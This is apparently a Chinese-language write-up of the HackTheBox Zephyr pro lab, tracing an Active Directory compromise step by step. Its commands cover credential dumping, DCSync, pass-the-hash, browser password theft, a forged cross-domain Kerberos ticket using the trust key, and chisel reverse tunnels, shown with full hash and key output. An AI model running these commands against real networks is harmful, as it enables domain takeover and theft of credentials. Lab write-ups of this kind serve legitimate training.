ZSM.LOCAL/marcus:$DCC2$10240#marcus#66dddfc25df0d824e30c55a9ecccb512: (2026-07-17 02:10:00+00:00)
ZSM.LOCAL/jamie:$DCC2$10240#jamie#8eaa1e87b84f7197df2b836fae8e5c3c: (2022-10-28 12:56:42+00:00)

[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
ZSM\ZPH-SVRMGMT1$:plain_password_hex:a59ff2202125f08774455a23ac8e623130743053e98d29eea3234cf4995bc3040b3e86e68c4ce7d681da4614f3b4d6066ce96a1a0257a1dca1221f864fcaf05f617d53ff9e6e7e8afedf8e4e70dd793440a6203fc780bbae017e795f3002958340850257b1caff49bcb045a861c67631dfb7f0ac6525ec72a9fd35035bfa1cb79578a785c08140a10abe5b756c2bcaa06ae1dceb3fe0f315a793c66aeaf35558deafd3d3796674de82fb98ba41878356fdde5ab8fc89dfe8a67c34015d64f03f52d515684b07c1bc9108daa73c6a63f49bf32e6403f850ae7d56ca6f2c49ca82fe414f14c100a2fb7cc901a2f07c52dc
ZSM\ZPH-SVRMGMT1$:aad3b435b51404eeaad3b435b51404ee:89d0b56874f61ad38bad336a77b8ef2f:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x05341d094f374bb97fd82b3a19619bbc3d28e967
dpapi_userkey:0xc4de07634653cdeda95b1baea5a86ceaa9683003
[*] NL$KM 
 0000   95 E8 38 F2 47 8A 41 12  A5 77 CA 0A 23 E6 56 28   ..8.G.A..w..#.V(
 0010   85 56 73 10 A9 49 99 6A  B5 5D FB C5 AD B4 4C 76   .Vs..I.j.]....Lv
 0020   3A 07 D8 40 73 ED EE 03  28 5E A6 02 7E 09 38 EA   :..@s...(^..~.8.
 0030   48 55 7F 6D 9C FD 9A 8B  C1 F1 F4 D7 0A 6F 3B D0   HU.m.........o;.
NL$KM:95e838f2478a4112a577ca0a23e6562885567310a949996ab55dfbc5adb44c763a07d84073edee03285ea6027e0938ea48557f6d9cfd9a8bc1f1f4d70a6f3bd0
[*] Cleaning up... 
[*] Stopping service RemoteRegistry

```

```
export KRB5CCNAME=$(pwd)/administrator@cifs_ZPH-SVRMGMT1.zsm.local@ZSM.LOCAL.ccache
proxychains4 impacket-psexec -k -no-pass 'zsm.local/administrator@ZPH-SVRMGMT1.zsm.local'
```

上传hack-browser-data.exe

找到浏览器的一个用户密码，

```
melissa

WinterIsHere2022!
```

挨个枚举

![image-20260720142904480](/images/htb-prolab/zephyr/20260720142904723.png)

```
proxychains -q nxc ldap 192.168.210.16 -u 'melissa' -p 'WinterIsHere2022!'
```

![image-20260720143331859](/images/htb-prolab/zephyr/20260720143331942.png)

![image-20260720150741121](/images/htb-prolab/zephyr/20260720150741207.png)

### ZEPHYR-CDC (.16)子域域控

首先需要拿到本地管理员的hash，接着利用hash登录进行dcsync

该用户有c盘的共享权限

```
proxychains4 impacket-smbclient 'internal.zsm.local/melissa:WinterIsHere2022!@192.168.210.16'

```

```
proxychains4 bloodyad -d internal.zsm.local -u melissa -p 'WinterIsHere2022!' -H 192.168.210.16 get object melissa --attr memberOf
```

查询melissa的memberof

```
proxychains4 impacket-smbclient 'internal.zsm.local/melissa:WinterIsHere2022!@192.168.210.16'
```

![image-20260721171830797](/images/htb-prolab/zephyr/20260721171831079.png)

解得

```
─(root㉿kali)-[~]
└─# impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xb1223a009047a376c120c3630a0f0e48
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5bdd6a33efe43f0dc7e3b2435579aa53:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
ZSM.LOCAL/Administrator:$DCC2$10240#Administrator#04a13c983d1c6f2ee43cc9aa0c4d49c6: (2026-06-04 05:09:12+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:dc66f30d3e8bd48b4bfb9c3f53eb66ebda1edbb7af476a9f7650476edce03326b61fabe212dfd9e6c2e06eaaffcab3c78cfd4f47cd564ef53e8eb5d855f9e998c34c5fabc5e713559e090d6e5dc149a97ed653608d5cd07864d7774f2d766512849d4fafff4030324173ccd8cb8c6a1513a348a337c6d46778e4e37bc2e2c2e369626f1f153bdf391f8c175fdae042537016a2198b8c120c738854c907a1ddddcb88aaa517af97bcee783d1d9a36ddc179f2bb5cc8a336a00863183c96384434bb9a8eee781822f51d2727cd14e3fd0841edfa7004eefa2a8e3327b457f34587642e1e91e79a24590d97b8ad6cb14ee7
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d47a6d90e1c5adf4200227514e393948
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xf108ba9fcd3554a2abb82ff4a8d29f0679aeaae6
dpapi_userkey:0xe57f2322d588ce987f04d6a3b1bf31cfa35d050a
[*] NL$KM 
 0000   07 E9 F2 3F 08 49 46 07  02 CE 30 4B 65 D3 86 32   ...?.IF...0Ke..2
 0010   6F 02 5D 36 7D E8 30 33  F4 71 94 44 98 37 CB 1A   o.]6}.03.q.D.7..
 0020   05 CC 76 F1 26 E2 94 E7  D3 54 78 1F EF BE E9 13   ..v.&....Tx.....
 0030   30 3B 62 CB A5 57 75 E6  78 F3 D4 55 5C 68 20 15   0;b..Wu.x..U\h .
NL$KM:07e9f23f0849460702ce304b65d386326f025d367de83033f47194449837cb1a05cc76f126e294e7d354781fefbee913303b62cba55775e678f3d4555c682015

```

拿到机器账户hash，拥有dcsync权限，拉取子域全部凭据

```
proxychains4 impacket-secretsdump -dc-ip 192.168.210.16 -hashes ':d47a6d90e1c5adf4200227514e393948' 'internal.zsm.local/ZPH-SVRCDC01$@192.168.210.16'
```

```
proxychains4 impacket-secretsdump -dc-ip 192.168.210.16 -hashes ':d47a6d90e1c5adf4200227514e393948' 'internal.zsm.local/ZPH-SVRCDC01$@192.168.210.16'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Dynamic chain  ...  192.168.201.128:9998  ...  192.168.210.16:445  ...  OK
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Dynamic chain  ...  192.168.201.128:9998  ...  192.168.210.16:135  ...  OK
[proxychains] Dynamic chain  ...  192.168.201.128:9998  ...  192.168.210.16:49668  ...  OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:543beb20a2a579c7714ced68a1760d5e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0540fe51ddd618f42a66ef059ac36441:::
internal.zsm.local\mssql_svc:6101:aad3b435b51404eeaad3b435b51404ee:8cb21ab7f3ee6d782c724216bd88d1d1:::
internal.zsm.local\Emily:6601:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Laura:6602:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Melissa:6603:aad3b435b51404eeaad3b435b51404ee:184260f5bf16a77d67a9d540fda79495:::
internal.zsm.local\Sarah:6604:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Amy:6605:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Steven:6606:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Malcolm:6607:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Aron:6608:aad3b435b51404eeaad3b435b51404ee:8cb21ab7f3ee6d782c724216bd88d1d1:::
internal.zsm.local\Matt:6609:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Jamie:6610:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
ZPH-SVRCDC01$:1000:aad3b435b51404eeaad3b435b51404ee:d47a6d90e1c5adf4200227514e393948:::
ZPH-SVRCHR$:1601:aad3b435b51404eeaad3b435b51404ee:06e402102d72956c62a63794a999935e:::
ZPH-SVRCSUP$:1602:aad3b435b51404eeaad3b435b51404ee:36e7d551e7cb15ca7dad3fd851fc707f:::
ZSM-SVRCSQL02$:5601:aad3b435b51404eeaad3b435b51404ee:ad854719bbb6fc1664316a14cc6eb88d:::
INT-MAINT$:6102:aad3b435b51404eeaad3b435b51404ee:cca9b0a476598d91ec3f567c468277f1:::
ZSM$:1103:aad3b435b51404eeaad3b435b51404ee:128d7741d0df97bd305569e8a97195bb:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:fbbb5e79da10a8b4609429942c12329391e4af7213e69560893b81c421375f0b
Administrator:aes128-cts-hmac-sha1-96:1f50b00b725eb4ed09a3def4e75ec9f0
Administrator:des-cbc-md5:439ed652fe5b38ae
krbtgt:aes256-cts-hmac-sha1-96:3bdcbeb0910e5887e6d6c7fbec6c3f29e1e099322ac91cc386ca296a5c5497b0
krbtgt:aes128-cts-hmac-sha1-96:b6252a6e5ec060751a03c1a73ef2af4e
krbtgt:des-cbc-md5:92755ef7ce8a6e16
internal.zsm.local\mssql_svc:aes256-cts-hmac-sha1-96:bea9de16d6775f6ed646cf8e002b2e6845e219f080a709410cb600f909d105ff
internal.zsm.local\mssql_svc:aes128-cts-hmac-sha1-96:4df91cf757b8cb7c5f6e544236293c8d
internal.zsm.local\mssql_svc:des-cbc-md5:5bdf199ee546e6f8
internal.zsm.local\Emily:aes256-cts-hmac-sha1-96:6fac0f47c747960e583ab9cb6d93c31a9425f9a921d246766c2d1a798e10fb56
internal.zsm.local\Emily:aes128-cts-hmac-sha1-96:fbba2f446451e35dd9cbf1d376580e1f
internal.zsm.local\Emily:des-cbc-md5:fd374cc262ec9201
internal.zsm.local\Laura:aes256-cts-hmac-sha1-96:bf6a8feea25df8f1640143c2dc26bc76128748962aef3d5e1c315b8bc7acc8c0
internal.zsm.local\Laura:aes128-cts-hmac-sha1-96:b994efccf32f7827c5ec3a43126a1118
internal.zsm.local\Laura:des-cbc-md5:add68cc23470b0f8
internal.zsm.local\Melissa:aes256-cts-hmac-sha1-96:b09d86e2e6480c2122ee1383f24e592a9642e16470a82bdeb9fff6875d41a922
internal.zsm.local\Melissa:aes128-cts-hmac-sha1-96:289e6d2c65f84c94f185e9755708cf3b
internal.zsm.local\Melissa:des-cbc-md5:982a25f7dc4cb3e9
internal.zsm.local\Sarah:aes256-cts-hmac-sha1-96:81028d54164a46107a6f6b9b0ac9a9216aee0e8d4bce82a3c668d5e1f16774c5
internal.zsm.local\Sarah:aes128-cts-hmac-sha1-96:d130b796b81c66348bc67a95029a19c7
internal.zsm.local\Sarah:des-cbc-md5:29ceaeb664bc2f9e
internal.zsm.local\Amy:aes256-cts-hmac-sha1-96:940adf4174eaaa50218561b87644cdf0210cdecb40ee5b6672312ef39e7f4390
internal.zsm.local\Amy:aes128-cts-hmac-sha1-96:655645f7b62f9d073a00ef7142c8da33
internal.zsm.local\Amy:des-cbc-md5:49e0d6bfd69868b6
internal.zsm.local\Steven:aes256-cts-hmac-sha1-96:9adcb602c37ce0ee4894d74a6575a6f70f7430e8e00446bc0850b787089c4cc4
internal.zsm.local\Steven:aes128-cts-hmac-sha1-96:e9731b435a8651cf11d52d71df936385
internal.zsm.local\Steven:des-cbc-md5:5dce8a52b389e5a2
internal.zsm.local\Malcolm:aes256-cts-hmac-sha1-96:f6e7d8a35afb386c1c271d6a53af85fcf8e306d36f281fdfc2c477c353f62c91
internal.zsm.local\Malcolm:aes128-cts-hmac-sha1-96:4bac2835d8be32ad5dd585ceb7450ef3
internal.zsm.local\Malcolm:des-cbc-md5:26b331256d2fbcd9
internal.zsm.local\Aron:aes256-cts-hmac-sha1-96:957fd600878eaad5dba70443e42d6a647b0b393211da3e62e55ef5bff965d9bb
internal.zsm.local\Aron:aes128-cts-hmac-sha1-96:26ef49f42cb51e023b50c84e360399eb
internal.zsm.local\Aron:des-cbc-md5:91cef44fc119f119
internal.zsm.local\Matt:aes256-cts-hmac-sha1-96:1877cc1d57a84d334b4a07a77c80086dfb76abe997f0339307efb32429b0deee
internal.zsm.local\Matt:aes128-cts-hmac-sha1-96:a4007666551eebd71856c6833faed374
internal.zsm.local\Matt:des-cbc-md5:2a4a5b467f9bb919
internal.zsm.local\Jamie:aes256-cts-hmac-sha1-96:899a0a57d770ad6510608350b67487beb5c50ac8f3455a1804ff4e8eb85da5e8
internal.zsm.local\Jamie:aes128-cts-hmac-sha1-96:abc87732e5844aafab3c8b355076a959
internal.zsm.local\Jamie:des-cbc-md5:5234a7253bd31f98
ZPH-SVRCDC01$:aes256-cts-hmac-sha1-96:8a67907987149e76179c1717526a984b286656ce9c5afae114b11a0e1187d282
ZPH-SVRCDC01$:aes128-cts-hmac-sha1-96:68e66ddb5aaf1e796af831a3a0527699
ZPH-SVRCDC01$:des-cbc-md5:298c2fb6f823790d
ZPH-SVRCHR$:aes256-cts-hmac-sha1-96:9b37dffd2f9e191262978b8a9cc9b41f782165e4f4709973c9e1e5ada5f80e35
ZPH-SVRCHR$:aes128-cts-hmac-sha1-96:cf8f357935397b6fcf7058e751ffd9e6
ZPH-SVRCHR$:des-cbc-md5:4698c19bbaf8b667
ZPH-SVRCSUP$:aes256-cts-hmac-sha1-96:980035e13beb4c1b68e5071f0b919bf1a11b37cf3573e0a88f0305614fb361d3
ZPH-SVRCSUP$:aes128-cts-hmac-sha1-96:a98bbab60af92f6b8ce9d1f93e9a230c
ZPH-SVRCSUP$:des-cbc-md5:ec7acd5d73fb371f
ZSM-SVRCSQL02$:aes256-cts-hmac-sha1-96:1270026132348b974c1a948cd7b202ae9678b5b3b03cdbdb4be825c1c11f4d71
ZSM-SVRCSQL02$:aes128-cts-hmac-sha1-96:5d3e1581bca6b36aac111bb16bc8e2e1
ZSM-SVRCSQL02$:des-cbc-md5:bf8faba8893475a7
INT-MAINT$:aes256-cts-hmac-sha1-96:5222d4a99827d8e10173a6984b94a685f21aed806825e22f08911c45bb5b6512
INT-MAINT$:aes128-cts-hmac-sha1-96:c15805616dc52a7d6a9d7b4bbacb93d0
INT-MAINT$:des-cbc-md5:26df6d5743bc153b
ZSM$:aes256-cts-hmac-sha1-96:9d73e53ed1b81e70f54bba25b59f24ba1b81883f7479723b96811246bf97dd20
ZSM$:aes128-cts-hmac-sha1-96:51c13503127f7d99fc0f867579f28719
ZSM$:des-cbc-md5:a7160bf2d97091ae
[*] Cleaning up... 

```

| 账户              | NTLM                               | 可用性            |
| ----------------- | ---------------------------------- | ----------------- |
| Administrator     | `543beb20a2a579c7714ced68a1760d5e` | 域管 PTH          |
| krbtgt            | `0540fe51ddd618f42a66ef059ac36441` | Golden Ticket     |
| 所有用户 AES keys | 完整 Kerberos 密钥                 | Overpass-the-Hash |

子域完全拿下

```
proxychains4 impacket-getTGT -dc-ip 192.168.210.16 -aesKey 'fbbb5e79da10a8b4609429942c12329391e4af7213e69560893b81c421375f0b' 'internal.zsm.local/Administrator'
export KRB5CCNAME=$(pwd)/Administrator.ccache

proxychains4 impacket-smbclient -k -no-pass -dc-ip 192.168.210.16 -target-ip 192.168.210.16 'internal.zsm.local/Administrator@ZPH-SVRCDC01.internal.zsm.local'

```

![image-20260720162103970](/images/htb-prolab/zephyr/20260721171739512.png)

ZEPHYR{In73rn4l_D0m41n_D0m1n473d} 

#### 子域信息收集

还有哪几台机器

```
┌──(root㉿kali)-[~]
└─# proxychains4 nxc smb 192.168.210.16 -u Administrator -H '543beb20a2a579c7714ced68a1760d5e' -d internal.zsm.local -x 'nslookup ZPH-SVRCHR'

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  192.168.201.128:9998  ...  192.168.210.16:445  ...  OK
[proxychains] Dynamic chain  ...  192.168.201.128:9998  ...  192.168.210.16:445  ...  OK
[proxychains] Dynamic chain  ...  192.168.201.128:9998  ...  192.168.210.16:135  ...  OK
SMB         192.168.210.16  445    ZPH-SVRCDC01     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRCDC01) (domain:internal.zsm.local) (signing:True) (SMBv1:None) (Null Auth:True)
[proxychains] Dynamic chain  ...  192.168.201.128:9998  ...  192.168.210.16:445  ...  OK
[proxychains] Dynamic chain  ...  192.168.201.128:9998  ...  192.168.210.16:445  ...  OK
SMB         192.168.210.16  445    ZPH-SVRCDC01     [+] internal.zsm.local\Administrator:543beb20a2a579c7714ced68a1760d5e (Pwn3d!)
[proxychains] Dynamic chain  ...  192.168.201.128:9998  ...  192.168.210.16:135  ...  OK
[proxychains] Dynamic chain  ...  192.168.201.128:9998  ...  192.168.210.16:51377  ...  OK
[proxychains] Dynamic chain  ...  192.168.201.128:9998  ...  192.168.210.16:51377  ...  OK
SMB         192.168.210.16  445    ZPH-SVRCDC01     [+] Executed command via wmiexec
SMB         192.168.210.16  445    ZPH-SVRCDC01     DNS request timed out.
SMB         192.168.210.16  445    ZPH-SVRCDC01         timeout was 2 seconds.
SMB         192.168.210.16  445    ZPH-SVRCDC01     Server:  UnKnown
SMB         192.168.210.16  445    ZPH-SVRCDC01     Address:  ::1
SMB         192.168.210.16  445    ZPH-SVRCDC01     Name:    ZPH-SVRCHR.internal.zsm.local
SMB         192.168.210.16  445    ZPH-SVRCDC01     Address:  192.168.210.17


                                                                                                                                                                                                                                          
┌──(root㉿kali)-[~/桌面]
└─# proxychains4 nxc smb 192.168.210.16 -u Administrator -H '543beb20a2a579c7714ced68a1760d5e' -d internal.zsm.local -x 'nslookup INT-MAINT.internal.zsm.local' --exec-method smbexec
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  192.168.201.128:9998  ...  192.168.210.16:445  ...  OK
[proxychains] Dynamic chain  ...  192.168.201.128:9998  ...  192.168.210.16:445  ...  OK
[proxychains] Dynamic chain  ...  192.168.201.128:9998  ...  192.168.210.16:135  ...  OK
SMB         192.168.210.16  445    ZPH-SVRCDC01     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRCDC01) (domain:internal.zsm.local) (signing:True) (SMBv1:None) (Null Auth:True)
[proxychains] Dynamic chain  ...  192.168.201.128:9998  ...  192.168.210.16:445  ...  OK
[proxychains] Dynamic chain  ...  192.168.201.128:9998  ...  192.168.210.16:445  ...  OK
SMB         192.168.210.16  445    ZPH-SVRCDC01     [+] internal.zsm.local\Administrator:543beb20a2a579c7714ced68a1760d5e (Pwn3d!)
[proxychains] Dynamic chain  ...  192.168.201.128:9998  ...  192.168.210.16:445  ...  OK
SMB         192.168.210.16  445    ZPH-SVRCDC01     [+] Executed command via smbexec
SMB         192.168.210.16  445    ZPH-SVRCDC01     DNS request timed out.
SMB         192.168.210.16  445    ZPH-SVRCDC01         timeout was 2 seconds.
SMB         192.168.210.16  445    ZPH-SVRCDC01     Server:  UnKnown
SMB         192.168.210.16  445    ZPH-SVRCDC01     Address:  ::1
SMB         192.168.210.16  445    ZPH-SVRCDC01     Name:    INT-MAINT.internal.zsm.local
SMB         192.168.210.16  445    ZPH-SVRCDC01     Address:  192.168.210.101
                                                                                                                                                                                                                                           
┌──(root㉿kali)-[~/桌面]

```

利用域控导入bloodhound数据

```
proxychains4 bloodhound-python -d internal.zsm.local -u Administrator --hashes ':543beb20a2a579c7714ced68a1760d5e' -dc ZPH-SVRCDC01.internal.zsm.local -ns 192.168.210.16 --dns-tcp --disable-autogc -c All --zip --auth-method ntlm
```

### ZEPHYR-HR (.17)子域

ADMINISTRATOR@INTERNAL.ZSM.LOCAL memberof ADMINISTRATORS@INTERNAL.ZSM.LOCAL writedacl ZPH-SVRCHRINTERNAL.ZSM.LOCAL

![image-20260720171030144](/images/htb-prolab/zephyr/20260720171030448.png)



```
proxychains4 nxc winrm 192.168.210.17 -u Administrator -H '543beb20a2a579c7714ced68a1760d5e' -d internal.zsm.local -x 'whoami && hostname && dir C:\Users\*.txt /s /b 2>nul && type C:\Users\Administrator\Desktop\flag.txt 2>nul'
```

直接找到flag了

![image-20260720174951897](/images/htb-prolab/zephyr/20260721171709907.png)

```
 ZEPHYR{S3rv1c3_M4n4g3m3nt_f41L5}
```

我是直接吧administrator的密码给改了

```
proxychains4 nxc winrm 192.168.210.17 -u Administrator -H '543beb20a2a579c7714ced68a1760d5e' -d internal.zsm.local -x 'net user Administrator Passw0rd123!'
```

![image-20260720180025899](/images/htb-prolab/zephyr/20260720180026196.png)

黄金票据＋sid history

在bloodhound上收集

ZPH-SVRCDCO1.INTERNAL.ZSM.LOCAL ->memberof ->ENTERPRISE DOMAIN CONTROLLERS@ZSM.LOCAL->GetChangesinFilteredSet->zsm.local->contains->DOMAIN CONTROLLERS@ZSM.LOCAL->contains->ZPH-SVRDC01.ZSM.LOCAL

![image-20260720192236481](/images/htb-prolab/zephyr/20260721171652065.png)

确认子域和父域的sid

```
proxychains impacket-lookupsid -hashes ':543beb20a2a579c7714ced68a1760d5e' 'internal.zsm.local/Administrator@192.168.210.16'

```

![image-20260720194447412](/images/htb-prolab/zephyr/20260721171554468.png)

子域 SID 确认：`S-1-5-21-3056178012-3972705859-491075245`

父域sid为 :`S-1-5-21-2734290894-461713716-141835440-519`

### ZEPHYR-DC (.10)父域域控

#### 推荐票

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0540fe51ddd618f42a66ef059ac36441:::

ZSM的hash

```
ZSM$:1103:aad3b435b51404eeaad3b435b51404ee:69ecc601f4681f770d0a8b188db615d4:::
```

`
这个账户就是父域 `zsm.local` 在子域中的 **inter-realm trust account**，它的密码就是两个域之间的**信任密钥**。

利用它，我们可以伪造一张**从子域到父域的跨域 TGT**，然后轻松拿到父域的任何权限

proxychains evil-winrm -i 192.168.210.16 -u Administrator -H 543beb20a2a579c7714ced68a1760d5e



```
# 1. forge the referral ticket
impacket-ticketer  -nthash "69ecc601f4681f770d0a8b188db615d4" -domain-sid "S-1-5-21-3056178012-3972705859-491075245" -domain "internal.zsm.local" -extra-sid "S-1-5-21-2734290894-461713716-141835440-519" -spn "krbtgt/zsm.local" "roxci"

# 2. use it to request a service ticket
KRB5CCNAME="roxci.ccache" 
 proxychains4 python3 getST.py -k -no-pass -debug -spn "CIFS/ZPH-SVRDC01.zsm.local" -dc-ip 192.168.210.10 "zsm.local/roxci@ZPH-SVRDC01.zsm.local"
```

![image-20260721121736168](/images/htb-prolab/zephyr/20260721132412410.png)

![image-20260721132430521](/images/htb-prolab/zephyr/20260721132430780.png)

```
KRB5CCNAME="roxci@ZPH-SVRDC01.zsm.local@CIFS_ZPH-SVRDC01.zsm.local@ZSM.LOCAL.ccache" proxychains4 python3 secretsdump.py -k -no-pass -just-dc-user "ZSM\\Administrator" -dc-ip 192.168.210.10 roxci@ZPH-SVRDC01.zsm.local

```

![image-20260721132501644](/images/htb-prolab/zephyr/20260721132501913.png)

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:84210eddc5724a7801fe78289ee94d44:::  
```

登录

```
proxychains4 evil-winrm -i 192.168.210.10 -u Administrator -H 84210eddc5724a7801fe78289ee94d44
```

![image-20260721132837344](/images/htb-prolab/zephyr/20260721132837627.png)

现在还剩两个机子了

ZEPHYR-ADFS 和ZEPHYR-SUPPORT 

ZEPHYR-ADFS的ip是192.168.210.14

ZEPHYR-SUPPORT 是192.168.210.10

### ZEPHYR-ADFS(.14)

既然已经拿到了域控

直接拿域控hash登录ADFS

```
proxychains4 nxc winrm 192.168.210.14 -u Administrator -H 84210eddc5724a7801fe78289ee94d44
```

![image-20260721145508154](/images/htb-prolab/zephyr/20260721145508543.png)

```
proxychains4 python3 smbclient.py "zsm.local"/"Administrator"@192.168.210.14 -hashes :84210eddc5724a7801fe78289ee94d44

```

![image-20260721150508860](/images/htb-prolab/zephyr/20260721150509134.png)

### ZEPHYR-SUPPORT(.18)

```
kali： ./chisel server -p 443 --reverse

210.13机子: nohup ./chisel client 10.10.16.47:443 R:192.168.89.128:9998:socks &
13上./chisel server -p 9999
17上.chisel.exe client 192.168.210.13:9998 R:0.0.0.0:9001:socks
```

在17上挂个代理直接连
